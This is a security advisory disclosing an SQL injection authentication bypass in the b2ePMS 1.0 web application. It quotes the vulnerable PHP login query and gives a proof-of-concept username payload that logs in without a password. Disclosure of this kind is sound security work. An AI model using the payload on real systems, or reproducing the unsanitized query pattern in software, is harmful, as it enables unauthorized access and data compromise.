b2ePMS 1.0 Authentication Bypass Vulnerability
#################################################

Discovered by: Jean Pascal Pereira <pereira@secbiz.de>

Vendor Information:

"b2ePMS stands for Browser to Email Phone Message System. It is intended to replace the standard
paper/carbon phone message slips commonly used in offices, with the capability of sending the message
via a web browser form directly to the recipients inbox."

Vendor URI: https://developer.berlios.de/projects/b2epms/

#################################################

Issue: SQL Injection, Authentication Bypass

Risk level: High

=> The remote attacker has the possibility to execute arbitrary SQL Code.

=> The remote attacker is able to bypass the user authentication.

In verify-user.php, line 20:

-------------------------------------

$sql = mysql_query("SELECT * FROM b2epms_user WHERE username=&#039;$username&#039; AND user_passwd=&#039;$admin_passwd&#039; AND
activated=&#039;1&#039; AND user_level=&#039;2&#039;");
$login_check = mysql_num_rows($sql);
if($login_check > 0){
while($row = mysql_fetch_array($sql)){
foreach( $row AS $key => $val ){
$$key = stripslashes( $val );
}
// Register session variables!
session_register(&#039;userid&#039;);
$_SESSION[&#039;userid&#039;] = $user_level;
mysql_query("UPDATE b2epms_user SET login_date=now() WHERE userid=&#039;$userid&#039;"); $url = "Location:
admin.php";
header($url);
}
}

-------------------------------------

Exploit / Proof Of Concept:

Perform a login with the following data:

Username: admin&#039; OR &#039;1=&#039;1
Password: x

-------------------------------------

#################################################



